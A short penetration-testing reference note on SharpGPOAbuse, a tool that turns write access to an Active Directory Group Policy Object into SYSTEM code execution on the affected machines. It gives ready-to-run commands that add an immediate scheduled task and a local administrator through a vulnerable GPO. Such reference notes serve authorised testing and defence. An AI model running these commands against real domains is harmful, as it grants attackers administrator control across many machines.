# SharpGPOAbuse

**Tags:** `#sharpgpoabuse` `#gpo` `#grouppolicy` `#lateralmovement` `#activedirectory` `#privesc`

C# tool (ReversecLabs/formerly FSecureLabs) that weaponizes **edit rights over a Group Policy Object**. When a controlled principal can write to a GPO applied to target machines/users, SharpGPOAbuse adds an immediate scheduled task, a local admin, a logon script, or a user right to that GPO — yielding code execution as **SYSTEM** on every computer the GPO applies to (or as the logged-on user for a user GPO). The Windows counterpart to [[Tools/AD/pyGPOAbuse|pyGPOAbuse]].

**Source:** https://github.com/ReversecLabs/SharpGPOAbuse
**Install:** Build the C# project in Visual Studio → `SharpGPOAbuse.exe`.

```powershell
# Immediate computer task → SYSTEM on affected hosts
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\user `
  --Command "cmd.exe" --Arguments "/c net localgroup administrators DOMAIN\user /add" `
  --GPOName "Vulnerable GPO"

# Direct local-admin add, or a user task
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount DOMAIN\user --GPOName "Vulnerable GPO"
```

---

> [!note] **See also** — [[Services/Active Directory/GPO Abuse|GPO Abuse]] — push a SYSTEM scheduled task / local admin via a writable GPO (Windows). ACL discovery: [[Services/Active Directory/ACL Abuse|ACL Abuse]].

---

*Created: 2026-09-25*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
